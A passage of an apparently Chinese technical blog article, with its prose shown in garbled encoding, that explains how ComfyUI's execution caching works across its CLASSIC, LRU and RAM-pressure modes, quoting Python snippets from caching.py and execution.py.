<p>HierarchicalCache é€šè¿‡ parent é“¾å®šä½å­ç¼“å­˜ï¼Œä»£ç åœ¨ comfy_execution/caching.py:242-269ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_cache_for</span>(<span class="hljs-params">self, node_id</span>):
    parent_id = self.dynprompt.get_parent_node_id(node_id)
    ...
    <span class="hljs-keyword">for</span> parent_id <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(hierarchy):
        cache = cache._get_subcache(parent_id)
        <span class="hljs-keyword">if</span> cache <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>: <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">return</span> cache

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, node_id</span>):
    cache = self._get_cache_for(node_id)
    <span class="hljs-keyword">if</span> cache <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>: <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">return</span> cache._get_immediate(node_id)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">set</span>(<span class="hljs-params">self, node_id, value</span>):
    cache = self._get_cache_for(node_id)
    <span class="hljs-keyword">assert</span> cache <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>
    cache._set_immediate(node_id, value)
</code></pre>
<p>å«ä¹‰å¾ˆç›´æ¥ï¼š</p>
<ul>
<li>æ ¹èŠ‚ç‚¹å­˜åœ¨å½“å‰ cacheï¼›</li>
<li>æŸäº›èŠ‚ç‚¹ç”Ÿæˆå­å›¾ï¼Œä¼šåœ¨è¯¥èŠ‚ç‚¹ä¸‹æŒ‚ä¸€ä¸ªå­ cacheï¼›</li>
<li>è¯»å†™æ—¶ï¼Œå…ˆé€šè¿‡ parent é“¾æ‰¾åˆ°å¯¹åº”çš„å­ cache å†è¯»å†™ã€‚</li>
</ul>
<p>clean_unused() é‡Œé™¤äº†æ¸…é™¤ä¸ç”¨çš„ keyï¼Œè¿˜ä¼šåˆ é™¤æ²¡ç”¨åˆ°çš„å­ cache åˆ†åŒºï¼ˆ_clean_subcaches()ï¼‰ã€‚</p>
<h2 data-id="heading-8">4. æ‰§è¡Œå¾ªç¯ä¸­çš„ä½¿ç”¨è·¯å¾„</h2>
<p>ç¼“å­˜ä¸æ˜¯â€œæŒ‚åœ¨é‚£å°±å®Œäº‹äº†â€ï¼Œå®ƒåœ¨æ‰§è¡Œå¾ªç¯ä¸­æœ‰æ¯”è¾ƒæ˜ç¡®çš„è°ƒç”¨ç‚¹ã€‚</p>
<h2 data-id="heading-9">4.1 è®¾ç½® prompt + æ¸…ç†</h2>
<p>å¯åŠ¨ä¸€æ¬¡æ‰§è¡Œæ—¶ï¼ˆexecution.py:681-685ï¼‰ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">is_changed_cache = <span class="hljs-built_in">IsChangedCache</span>(prompt_id, dynamic_prompt, self.caches.outputs)
for cache in self<span class="hljs-selector-class">.caches</span><span class="hljs-selector-class">.all</span>:
    await cache.<span class="hljs-built_in">set_prompt</span>(dynamic_prompt, prompt.<span class="hljs-built_in">keys</span>(), is_changed_cache)
    cache.<span class="hljs-built_in">clean_unused</span>()
</code></pre>
<p>è¿™é‡Œåšäº†ä¸‰ä»¶äº‹ï¼š</p>
<ol>
<li>ç»™å½“å‰ prompt ç”Ÿæˆä¸€ä¸ª IsChangedCacheï¼Œä¸º key è®¡ç®—æä¾› is_changed ç»“æœï¼›</li>
<li>å¯¹ outputs / objects å„è‡ªæ‰§è¡Œä¸€æ¬¡ set_promptï¼ˆä¸åŒç­–ç•¥å®ç°ä¸åŒï¼‰ï¼›</li>
<li>ç´§æ¥ç€æ‰§è¡Œ clean_unused()ï¼Œåšä¸€æ¬¡åŸºäºâ€œå½“å‰ prompt é”®é›†åˆâ€çš„æ¸…ç†ã€‚</li>
</ol>
<h2 data-id="heading-10">4.2 èŠ‚ç‚¹æ‰§è¡Œå‰åï¼šcache å‘½ä¸­ä¸å†™å…¥</h2>
<p>åœ¨èŠ‚ç‚¹æ‰§è¡Œè·¯å¾„ä¸­ï¼š</p>
<ul>
<li>æ‰§è¡Œå‰ï¼šä¼˜å…ˆå°è¯•ä» outputs å‘½ä¸­ï¼ˆexecution.py:686-701ï¼‰ï¼›</li>
<li>æ‰§è¡Œåï¼šå°† (ui, outputs) ä½œä¸º CacheEntry å†™å…¥ outputsï¼ˆexecution.py:568-571ï¼‰ã€‚</li>
</ul>
<p>ä¸ºäº†ç®€åŒ–ï¼Œè¿™é‡Œåªçœ‹æŠ½è±¡è¡Œä¸ºï¼š</p>
<ul>
<li>å‘½ä¸­ â†’ è·³è¿‡è®¡ç®—ï¼Œç›´æ¥æ‹¿å€¼ï¼›</li>
<li>æœªå‘½ä¸­ â†’ æ­£å¸¸è·‘ä¸€éï¼Œå°†ç»“æœå¡å›ç¼“å­˜ã€‚</li>
</ul>
<h2 data-id="heading-11">4.3 æ¯ä¸ªèŠ‚ç‚¹ä¹‹åçš„ RAM è½®è¯¢</h2>
<p>å¦‚æœæ˜¯ RAM_PRESSURE æ¨¡å¼ï¼Œæ‰§è¡Œå®Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šè§¦å‘ä¸€æ¬¡å†…å­˜æ£€æŸ¥ï¼ˆexecution.py:720ï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">self.caches.outputs.poll(<span class="hljs-attr">ram_headroom</span>=self.cache_args[<span class="hljs-string">"ram"</span>])
</code></pre>
<p>åªæœ‰ RAMPressureCache å®ç°äº† pollï¼Œå…¶ä»–æ¨¡å¼ä¸‹è¿™ä¸ªè°ƒç”¨ç­‰åŒç©ºæ“ä½œã€‚</p>
<hr/>
<h2 data-id="heading-12">5. CLASSICï¼šé»˜è®¤å±‚çº§ç¼“å­˜</h2>
<p>å…ˆçœ‹é»˜è®¤ç­–ç•¥ï¼šCLASSICã€‚</p>
<h2 data-id="heading-13">5.1 åˆå§‹åŒ–ä¸ç»“æ„</h2>
<p>CacheSet.init_classic_cacheï¼ˆexecution.py:97-126ï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">class CacheType(Enum):
    <span class="hljs-attr">CLASSIC</span> = <span class="hljs-number">0</span>
    <span class="hljs-attr">LRU</span> = <span class="hljs-number">1</span>
    <span class="hljs-attr">NONE</span> = <span class="hljs-number">2</span>
    <span class="hljs-attr">RAM_PRESSURE</span> = <span class="hljs-number">3</span>

class CacheSet:
    def init_classic_cache(self):
        <span class="hljs-attr">self.outputs</span> = HierarchicalCache(CacheKeySetInputSignature)
        <span class="hljs-attr">self.objects</span> = HierarchicalCache(CacheKeySetID)
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼š</p>
<ul>
<li>outputs ç”¨å±‚çº§ç¼“å­˜ + è¾“å…¥ç­¾ååš keyï¼›</li>
<li>objects ä¹Ÿç”¨å±‚çº§ç¼“å­˜ + (node_id, class_type) åš keyï¼›</li>
<li>ä¸æ¶‰åŠ LRU æˆ– RAM é©±é€ã€‚</li>
</ul>
<h2 data-id="heading-14">5.2 CLASSIC çš„è¿‡æœŸæœºåˆ¶ï¼šå®Œå…¨ç”±ã€Œå½“å‰ promptã€é©±åŠ¨</h2>
<p>CLASSIC æ¨¡å¼ä¸åšå®¹é‡å’Œæ—¶é—´ç®¡ç†ï¼Œå®ƒåªæœ‰ä¸¤ç§â€œå¤±æ•ˆâ€æ–¹å¼ï¼š</p>
<ol>
<li>æç¤ºåˆ‡æ¢ / æ‰§è¡Œå‰æ¸…ç†</li>
</ol>
<p>clean_unused() çš„æ ¸å¿ƒé€»è¾‘ï¼ˆcomfy_execution/caching.py:172-195ï¼‰ï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">clean_unused</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):
    <span class="hljs-variable language_">self</span>._clean_cache()
    <span class="hljs-variable language_">self</span>._clean_subcaches()
</code></pre>
<ul>
<li>_clean_cache()ï¼šæŠŠä¸åœ¨â€œå½“å‰ prompt é”®é›†åˆâ€çš„é¡¹åˆ æ‰ï¼›</li>
<li>_clean_subcaches()ï¼šæŠŠä¸å†éœ€è¦çš„å­ç¼“å­˜åˆ†åŒºåˆ æ‰ã€‚</li>
</ul>
<p>åœ¨ execution.py:681-685 æ¯æ¬¡ç»‘å®šæ–° prompt æ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œè¿™ä¸€æ­¥ã€‚ç»“æœæ˜¯ï¼š</p>
<ul>
<li>æ¢äº†ä¸€ä¸ªæ–°çš„ workflow / promptï¼Œæ—§ workflow çš„ outputs / objects éƒ½ä¼šè¢«è§†ä¸ºâ€œæœªä½¿ç”¨â€ï¼Œè¢«æ¸…ç†æ‰ï¼›</li>
<li>CLASSIC ä¸ä¼šè·¨ä¸åŒ prompt ä¿ç•™æ—§ workflow çš„ç¼“å­˜ã€‚</li>
</ul>
<ol>
<li>é”®ä¸å‘½ä¸­ï¼ˆæŒ‡çº¹å¤±æ•ˆï¼‰</li>
</ol>
<p>is_changed çš„è®¡ç®—åœ¨ execution.py:48-89ï¼Œå½“èŠ‚ç‚¹è¾“å…¥æ›´æ–°æ—¶ï¼ŒæŒ‡çº¹ä¼šå˜åŒ–ï¼›CacheKeySetInputSignature åœ¨æ„é€ é”®æ—¶ä¼šæŠŠè¿™ä¸ªæŒ‡çº¹å¸¦è¿›å»ï¼ˆcomfy_execution/caching.py:115-127ï¼‰ã€‚å› æ­¤åªè¦ï¼š</p>
<ul>
<li>å‚æ•° / è¾“å…¥ / ä¸Šæ¸¸èŠ‚ç‚¹çš„ä»»ä¸€å˜åŒ– â†’ key æ”¹å˜ â†’ æ—§å€¼è‡ªç„¶ä¸å‘½ä¸­ã€‚</li>
</ul>
<h2 data-id="heading-15">5.3 CLASSIC æ˜ç¡®ä¸ä¼šåšçš„äº‹</h2>
<p>åœ¨ CLASSIC ä¸‹ï¼š</p>
<ul>
<li>ä¸åš LRU å®¹é‡æ§åˆ¶ï¼šæ²¡æœ‰ max_sizeï¼Œä¹Ÿæ²¡æœ‰ä»£é™…æ·˜æ±°é€»è¾‘ï¼›</li>
<li>ä¸åš RAM å‹åŠ›é©±é€ï¼špoll() æ˜¯ç©ºçš„ï¼Œæ‰§è¡Œå¾ªç¯é‡Œå³ä½¿è°ƒç”¨äº†ä¹Ÿä»€ä¹ˆéƒ½ä¸å¹²ï¼›</li>
<li>ä¸åš TTLï¼šä¸çœ‹æ—¶é—´ï¼Œåªçœ‹ prompt é”®é›†åˆã€‚</li>
</ul>
<p>å¯¹åº”çš„æ³¨é‡Šå·²ç»åœ¨å‚è€ƒå†…å®¹ä¸­ç‚¹å¾—å¾ˆæ¸…æ¥šï¼Œè¿™é‡Œå°±ä¸é‡å¤å †ä»£ç äº†ã€‚</p>
<h2 data-id="heading-16">5.4 åœ¨é¢‘ç¹åˆ‡æ¢ workflow / æ¨¡å‹æ—¶çš„è¡¨ç°</h2>
<p>ç»“åˆä¸Šé¢çš„æœºåˆ¶ï¼Œæ€»ç»“ä¸€ä¸‹ CLASSIC åœ¨å¤š workflow åœºæ™¯ä¸‹çš„è¡Œä¸ºï¼š</p>
<ul>
<li>æ‰§è¡Œæ–°å·¥ä½œæµæ—¶ï¼š set_prompt + clean_unused ä¼šç›´æ¥æŠŠâ€œä¸åœ¨æ–° prompt é”®é›†åˆé‡Œâ€çš„ç¼“å­˜é¡¹ï¼ˆåŒ…æ‹¬å¯¹è±¡å­ç¼“å­˜ï¼‰å…¨éƒ¨æ¸…æ‰ï¼›</li>
<li>æ¨¡å‹ / LoRA å˜åŒ–ï¼š å³ä¾¿èŠ‚ç‚¹ ID ä¸å˜ï¼Œè¾“å…¥ç­¾åå’Œ is_changed æŒ‡çº¹ä¸åŒï¼Œä¹Ÿä¼šç”Ÿæˆæ–°é”®ï¼›æ—§æ¡ç›®å…ˆä¸å‘½ä¸­ï¼Œéšååœ¨ä¸‹ä¸€æ¬¡ prompt ç»‘å®šæ—¶è¢«æ¸…ç©ºï¼›</li>
<li>å›åˆ‡æ—§ workflowï¼š å› ä¸ºåœ¨ä¸Šä¸€æ¬¡åˆ‡æ¢æ—¶å·²ç»æŠŠæ—§ workflow ç›¸å…³ç¼“å­˜æ¸…å¹²å‡€äº†ï¼Œæ‰€ä»¥åŸºæœ¬ç­‰äºé‡æ–°è®¡ç®—ã€‚</li>
</ul>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>workflow æ¯”è¾ƒå›ºå®šï¼›</li>
<li>ä¸»è¦æƒ³åœ¨â€œä¸€æ¬¡æ‰§è¡Œå½“ä¸­â€å¤ç”¨ä¸­é—´ç»“æœï¼Œä¸åœ¨æ„è·¨ prompt çš„æŒä¹…åŒ–ã€‚</li>
</ul>
<h2 data-id="heading-17">6. LRUï¼šä»£é™… LRU æ§åˆ¶ outputs å°ºå¯¸</h2>
<p>ç¬¬äºŒç§ç­–ç•¥æ˜¯ LRUï¼Œä¸»è¦è§£å†³çš„é—®é¢˜æ˜¯ï¼šåœ¨å…è®¸è·¨ prompt å¤ç”¨è¾“å‡ºçš„å‰æä¸‹ï¼Œé™åˆ¶ç¼“å­˜æ€»é‡ï¼Œé¿å…æ— é™è†¨èƒ€ã€‚</p>
<h2 data-id="heading-18">6.1 åˆå§‹åŒ–ï¼šåªä½œç”¨äº outputs</h2>
<p>CacheSet.init_lru_cacheï¼ˆexecution.py:127-135ï¼‰ï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_lru_cache</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, cache_size</span>):
    <span class="hljs-variable language_">self</span>.outputs = <span class="hljs-title class_">LRUCache</span>(<span class="hljs-title class_">CacheKeySetInputSignature</span>, max_size=cache_size)
    <span class="hljs-variable language_">self</span>.objects = <span class="hljs-title class_">HierarchicalCache</span>(<span class="hljs-title class_">CacheKeySet</span>ID)
</code></pre>
<p>æ³¨æ„å‡ ç‚¹ï¼š</p>
<ul>
<li>LRU åªä½œç”¨äº outputsï¼›</li>
<li>objects ä»ç„¶ç”¨ HierarchicalCacheï¼Œä¸å— LRU é©±é€ï¼›</li>
<li>å¯åŠ¨æ–¹å¼ï¼š--cache-lru Nï¼Œä¸” N &gt; 0ã€‚</li>
</ul>
<h2 data-id="heading-19">6.2 LRU çš„ä»£é™…è®¾è®¡</h2>
<p>LRUCache çš„éª¨æ¶é€»è¾‘åœ¨ comfy_execution/caching.py:299-337ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LRUCache</span>(<span class="hljs-title class_ inherited__">BasicCache</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key_class, max_size=<span class="hljs-number">100</span></span>):
        self.max_size = max_size
        self.min_generation = <span class="hljs-number">0</span>
        self.generation = <span class="hljs-number">0</span>
        self.used_generation = {}
        self.children = {}

    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_prompt</span>(<span class="hljs-params">...</span>):
        self.generation += <span class="hljs-number">1</span>
        <span class="hljs-keyword">for</span> node_id <span class="hljs-keyword">in</span> node_ids:
            self._mark_used(node_id)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, node_id</span>):
        self._mark_used(node_id)
        <span class="hljs-keyword">return</span> self._get_immediate(node_id)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_mark_used</span>(<span class="hljs-params">self, node_id</span>):
        cache_key = self.cache_key_set.get_data_key(node_id)
        <span class="hljs-keyword">if</span> cache_key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            self.used_generation[cache_key] = self.generation
</code></pre>
<p>å«ä¹‰ï¼š</p>
<ul>
<li>æœ‰ä¸€ä¸ªå…¨å±€ä»£æ•° generationï¼Œæ¯æ¬¡ç»‘å®šæ–° prompt generation += 1ï¼›</li>
<li>æ¯æ¬¡ï¼š</li>
<li>ç»‘å®š prompt æ—¶ï¼Œä¼šæŠŠè¯¥ prompt å†…æ‰€æœ‰èŠ‚ç‚¹æ ‡è®°ä¸ºâ€œåœ¨å½“å‰ä»£è¢«ä½¿ç”¨â€ï¼›</li>
<li>get / set æ—¶æ›´æ–°æ¡ç›®çš„ used_generation[key] ä¸ºå½“å‰ä»£ã€‚</li>
</ul>
<h2 data-id="heading-20">6.3 å®¹é‡é©±é€ï¼šæŒ‰ã€Œæœ€è€ä»£ã€é€æ­¥æ¸…ç†</h2>
<p>clean_unused() çš„ä¸€éƒ¨åˆ†é€»è¾‘åœ¨ comfy_execution/caching.py:314-323ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">clean_unused</span>(<span class="hljs-params">self</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(self.cache) &gt; self.max_size <span class="hljs-keyword">and</span> self.min_generation &lt; self.
    generation:
        self.min_generation += <span class="hljs-number">1</span>
        to_remove = [key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.cache <span class="hljs-keyword">if</span> self.used_generation[key] &lt; self.
        min_generation]
        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> to_remove:
            <span class="hljs-keyword">del</span> self.cache[key]
            <span class="hljs-keyword">del</span> self.used_generation[key]
            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> self.children:
                <span class="hljs-keyword">del</span> self.children[key]
    self._clean_subcaches()
</code></pre>
<p>ç®€å•å½’çº³ä¸€ä¸‹ï¼š</p>
<ul>
<li>åªè¦ len(cache) &gt; max_sizeï¼Œå°±é€æ­¥æå‡ min_generationï¼›</li>
<li>æ¯æå‡ä¸€ä»£ï¼Œå°±åˆ é™¤â€œæœ€è¿‘ä½¿ç”¨ä»£ &lt; min_generationâ€çš„æ¡ç›®ï¼›</li>
<li>åŒæ­¥æ¸…é™¤æ‰å’Œè¿™äº› key ç»‘å®šçš„å­ç¼“å­˜å¼•ç”¨ï¼›</li>
<li>æ¸…ç†å®Œå†æ‰§è¡Œ _clean_subcaches() åšå±‚çº§æ¸…æ‰«ã€‚</li>
</ul>
<h2 data-id="heading-21">6.4 å­å›¾åˆ†åŒºä¸ä»£é™…é…åˆ</h2>
<p>å­ç¼“å­˜åˆ›å»ºæ—¶ä¼šæ˜¾å¼æ ‡è®°çˆ¶èŠ‚ç‚¹å’Œå­èŠ‚ç‚¹â€œè¢«ä½¿ç”¨â€ï¼Œé¿å…åˆšåˆšç”Ÿæˆçš„å­å›¾è¢«è¯¯åˆ ã€‚ä»£ç åœ¨ comfy_execution/caching.py:338-349ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">ensure_subcache_for</span>(<span class="hljs-params">self, node_id, children_ids</span>):
    <span class="hljs-keyword">await</span> <span class="hljs-built_in">super</span>()._ensure_subcache(node_id, children_ids)
    <span class="hljs-keyword">await</span> self.cache_key_set.add_keys(children_ids)
    self._mark_used(node_id)
    cache_key = self.cache_key_set.get_data_key(node_id)
    self.children[cache_key] = []
    <span class="hljs-keyword">for</span> child_id <span class="hljs-keyword">in</span> children_ids:
        self._mark_used(child_id)
        self.children[cache_key].append(self.cache_key_set.get_data_key(child_id))
    <span class="hljs-keyword">return</span> self
</code></pre>
<p>é…åˆå‰é¢æåˆ°çš„å±‚çº§ç»“æ„ï¼Œå°±å½¢æˆäº†â€œæŒ‰ workflow å­å›¾åˆ†åŒº + LRU æŒ‰ä»£é™…æ¸…ç†â€çš„æ•´ä½“è¡Œä¸ºã€‚</p>
<h2 data-id="heading-22">6.5 è§¦å‘æ—¶æœºå’Œè¡Œä¸ºæ€»ç»“</h2>
<p>åœ¨ LRU æ¨¡å¼ä¸‹ï¼š</p>
<ul>
<li>æ¯æ¬¡ç»‘å®š promptï¼š generation += 1ï¼Œæ ‡è®°å½“å‰ prompt çš„èŠ‚ç‚¹ä½¿ç”¨ä»£ä¸ºå½“å‰ä»£ï¼›</li>
<li>æ¯æ¬¡ get/setï¼š æ›´æ–°æ¡ç›®çš„ used_generation ä¸ºå½“å‰ä»£ï¼›</li>
<li>æ¯æ¬¡ clean_unused()ï¼š</li>
<li>å½“ len(cache) &gt; max_size æ—¶ï¼Œé€šè¿‡æå‡ min_generation æ¸…é™¤æ—§ä»£æ¡ç›®ï¼›</li>
<li>é¢å¤–æ¸…ç†æ— ç”¨å­ç¼“å­˜ã€‚</li>
</ul>
<p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li>å¯ä»¥è·¨ prompt ä¿ç•™ä¸€éƒ¨åˆ†ä¸­é—´ç»“æœï¼›</li>
<li>ç”± max_size æ§åˆ¶ç¼“å­˜ä¸Šé™ï¼›</li>
<li>æ²¡æœ‰ RAM å‹åŠ›æ„ŸçŸ¥ï¼špoll() ä¾ç„¶ä¸åšäº‹ã€‚</li>
</ul>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>å¸Œæœ›åœ¨å¤š workflow ä¹‹é—´éƒ¨åˆ†å¤ç”¨ç¼“å­˜ï¼›</li>
<li>ä½†æœºå™¨å†…å­˜æœ‰é™ï¼Œéœ€è¦ç»™ outputs ä¸€ä¸ªæ˜ç¡®çš„å®¹é‡ä¸Šé™ï¼›</li>
<li>å¯¹ RAM ç»†ç²’åº¦æ§åˆ¶æ²¡æœ‰å¼ºéœ€æ±‚ï¼Œæˆ–ä½¿ç”¨çš„æ˜¯ç‰©ç†æœº / å†…å­˜è¶³å¤Ÿçš„ç¯å¢ƒã€‚</li>
</ul>
<h2 data-id="heading-23">7. RAM_PRESSUREï¼šæŒ‰å¯ç”¨å†…å­˜å‹åŠ›é©±é€</h2>
<p>ç¬¬ä¸‰ç§ç­–ç•¥æ˜¯ RAM_PRESSUREï¼Œå¯¹åº”ç±»æ˜¯ RAMPressureCacheã€‚å®ƒç»§æ‰¿è‡ª LRUCacheï¼Œä½†ä¸æŒ‰ max_size åšé©±é€ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>é€šè¿‡ poll(ram_headroom)ï¼Œåœ¨å¯ç”¨å†…å­˜ä¸è¶³æ—¶æŒ‰â€œOOM è¯„åˆ†â€é©±é€æ¡ç›®ã€‚</li>
</ul>
<h2 data-id="heading-24">7.1 åˆå§‹åŒ–ï¼šobjects ä»ç„¶æ˜¯å±‚çº§ç¼“å­˜</h2>
<p>CacheSet.init_ram_cacheï¼ˆexecution.py:131-133ï¼‰ï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_ram_cache</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, min_headroom</span>):
    <span class="hljs-variable language_">self</span>.outputs = <span class="hljs-title class_">RAMPressureCache</span>(<span class="hljs-title class_">CacheKeySetInputSignature</span>)
    <span class="hljs-variable language_">self</span>.objects = <span class="hljs-title class_">HierarchicalCache</span>(<span class="hljs-title class_">CacheKeySet</span>ID)
</code></pre>
<p>æ³¨æ„ä¸¤ä¸ªç‚¹ï¼š</p>
<ul>
<li>RAM æ¨¡å¼ä¸‹ï¼Œåªæœ‰ outputs ä¼šæŒ‰ RAM å‹åŠ›é©±é€ï¼›</li>
<li>objects ä¸å‚ä¸ RAM é©±é€ï¼Œé€»è¾‘å®Œå…¨å’Œ CLASSIC/LRU ä¸‹ç›¸åŒã€‚</li>
</ul>
<h2 data-id="heading-25">7.2 pollï¼šå¯ç”¨ RAM æ£€æµ‹ + OOM è¯„åˆ†é©±é€</h2>
<p>poll çš„ä¸»é€»è¾‘åœ¨ comfy_execution/caching.py:384-454ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">poll</span>(<span class="hljs-params">self, ram_headroom</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_ram_gb</span>():
        <span class="hljs-comment"># ä¼˜å…ˆ cgroup v2/v1ï¼Œå¤±è´¥å›é€€ psutil</span>
        ...
    <span class="hljs-keyword">if</span> _ram_gb() &gt; ram_headroom: <span class="hljs-keyword">return</span>
    gc.collect()
    <span class="hljs-keyword">if</span> _ram_gb() &gt; ram_headroom: <span class="hljs-keyword">return</span>
    clean_list = []
    <span class="hljs-keyword">for</span> key, (outputs, _), <span class="hljs-keyword">in</span> self.cache.items():
        oom_score = RAM_CACHE_OLD_WORKFLOW_OOM_MULTIPLIER ** (self.generation -
        self.used_generation[key])
        ram_usage = RAM_CACHE_DEFAULT_RAM_USAGE
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_list_for_ram_usage</span>(<span class="hljs-params">outputs</span>):
            <span class="hljs-keyword">nonlocal</span> ram_usage
            ...
        scan_list_for_ram_usage(outputs)
        oom_score *= ram_usage
        bisect.insort(clean_list, (oom_score, self.timestamps[key], key))
    <span class="hljs-keyword">while</span> _ram_gb() &lt; ram_headroom * RAM_CACHE_HYSTERESIS <span class="hljs-keyword">and</span> clean_list:
        _, _, key = clean_list.pop()
        <span class="hljs-keyword">del</span> self.cache[key]
        gc.collect()
</code></pre>
<p>æµç¨‹æ‹†ä¸€ä¸‹ï¼š</p>
<ol>
<li>è·å–å¯ç”¨ RAM _ram_gb() çš„å®ç°ä¼˜å…ˆè¯»å– cgroup çš„é™åˆ¶ï¼š</li>
</ol>
<ul>
<li>cgroup v2ï¼šmemory.max / memory.currentï¼›</li>
<li>cgroup v1ï¼šmemory.limit_in_bytes / memory.usage_in_bytesï¼›</li>
<li>éƒ½å¤±è´¥æ‰å›é€€ psutil.virtual_memory().availableã€‚</li>
</ul>
<p>è¿™è§£å†³äº†å®¹å™¨ç¯å¢ƒä¸‹â€œå®¿ä¸»æœºå†…å­˜å¤§ï¼Œå®¹å™¨å®é™…è¢«é™åˆ¶â€çš„å¸¸è§é—®é¢˜ã€‚</p>
<ol>
<li>é˜ˆå€¼å’Œ GC</li>
</ol>
<ul>
<li>å¦‚æœå¯ç”¨ RAM &gt; ram_headroomï¼Œç›´æ¥è¿”å›ï¼›</li>
<li>å¦åˆ™å…ˆè·‘ä¸€æ¬¡ gc.collect()ï¼›</li>
<li>å†æµ‹ä¸€æ¬¡ RAMï¼Œå¦‚æœè¿˜æ˜¯ä¸è¶³ï¼Œè¿›å…¥é©±é€æµç¨‹ã€‚</li>
</ul>
<ol>
<li>ä¸ºæ¯ä¸ªæ¡ç›®è®¡ç®— OOM è¯„åˆ†</li>
</ol>
<ul>
<li>
<p>åˆå§‹ oom_score = RAM_CACHE_OLD_WORKFLOW_OOM_MULTIPLIER ** (generation - used_generation[key])ï¼š</p>
</li>
<li>
<p>å¤§æ¦‚æ„æ€æ˜¯ï¼šè¶Šä¹…æ²¡è¢«ç”¨ï¼Œåˆ†æ•°æŒ‡æ•°çº§æ”¾å¤§ï¼ˆé»˜è®¤å€æ•°ä¸º 1.3ï¼Œè§ comfy_execution/caching.py:365ï¼‰ï¼›</p>
</li>
<li>
<p>åˆå§‹ ram_usage = RAM_CACHE_DEFAULT_RAM_USAGEï¼ˆ0.1ï¼Œè§ 360ï¼‰ï¼›</p>
</li>
<li>
<p>é€’å½’éå† outputs åˆ—è¡¨ï¼š</p>
</li>
<li>
<p>CPU tensorï¼šnumel * element_size * 0.5ï¼ˆè®¤ä¸º CPU ä¸Šçš„ tensor ä»·å€¼æ›´é«˜ï¼ŒæŠ˜åŠï¼‰ï¼›</p>
</li>
<li>
<p>è‡ªå®šä¹‰å¯¹è±¡ï¼šå¦‚æœå®ç°äº† get_ram_usage() å°±åŠ ä¸Šå®ƒï¼›</p>
</li>
<li>
<p>æœ€å oom_score *= ram_usageï¼Œå¾—åˆ°ç»¼åˆè¯„åˆ†ã€‚</p>
</li>
</ul>
<p>æ‰€æœ‰æ¡ç›®æŒ‰ (oom_score, timestamp, key) æ’åºï¼Œæ”¾å…¥ clean_listã€‚</p>
<ol>
<li>æŒ‰è¿Ÿæ»é˜ˆå€¼é€ä¸ªåˆ é™¤</li>
</ol>
<ul>
<li>åªè¦ _ram_gb() &lt; ram_headroom * RAM_CACHE_HYSTERESISï¼Œå°±ä» clean_list æœ«å°¾ pop ä¸€ä¸ª key å¹¶åˆ é™¤ï¼›</li>
<li>æ¯åˆ ä¸€ä¸ªéƒ½è·‘ä¸€æ¬¡ gc.collect()ï¼›</li>
<li>è¿Ÿæ»å€æ•° RAM_CACHE_HYSTERESIS é»˜è®¤ 1.1ï¼Œé¿å…â€œåˆšåˆ å®Œåˆé©¬ä¸Šè§¦å‘æ¸…ç†â€çš„æŠ–åŠ¨ã€‚</li>
</ul>
<ol>
<li>è®¿é—®æ—¶é—´æˆ³ è®¿é—®æ—¶ä¼šæ›´æ–° timestampsï¼ˆcomfy_execution/caching.py:376-382ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-ruby" lang="ruby">   <span class="hljs-keyword">def</span> <span class="hljs-title function_">set</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, node_id, value</span>):
       <span class="hljs-variable language_">self</span>.timestamps[<span class="hljs-variable language_">self</span>.cache_key_set.get_data_key(node_id)] = time.time()
       <span class="hljs-variable language_">super</span>().set(node_id, value)

   <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, node_id</span>):
